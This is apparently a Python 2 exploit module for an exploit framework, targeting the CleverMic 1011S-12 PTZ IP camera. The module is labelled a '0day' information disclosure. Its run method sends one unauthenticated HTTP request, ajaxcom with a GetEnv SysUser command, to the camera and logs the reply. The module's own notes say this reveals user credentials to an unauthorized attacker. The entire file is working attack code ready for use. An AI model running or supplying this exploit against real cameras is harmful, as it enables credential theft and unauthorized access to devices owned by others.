#!/usr/bin/env python

import urllib2
import pprint
from collections import OrderedDict
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_CleverMic_1011S_12_ip_camera_info_disclosure"
INFO['DESCRIPTION'] = "CleverMic 1011S-12 IP Camera Info Disclosure"
INFO['VENDOR'] = "https://unitsolutions.ru/ptz-camera/1227-ptz-kamera-clevermic-1011s-12.html"
INFO["CVE Name"] = "0day"
INFO["DOWNLOAD_LINK"] = ""
INFO["LINKS"] = []
INFO['CHANGELOG'] = "21 Dec, 2017"
INFO['PATH'] = "General/"
INFO["NOTES"] = """
    Unauthorized attacker can obtain users credentials.
Tested against firmware V2.4.3 2017-7-17.
"""

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.13"
OPTIONS["PORT"] = 80


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])

    def make_url(self, path=''):
        url = 'http://{}:{}/{}'.format(self.host, self.port, path)
        return url

    def run(self):
        #Get options from gui
        self.args()
        self.log("[*] Trying to connect to {}".format(self.make_url()))
        url = self.make_url('ajaxcom?szCmd={"GetEnv":{"SysUser":{}}}')
        res = urllib2.urlopen(url).read()
        self.log('[+]\r\n' + res)
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
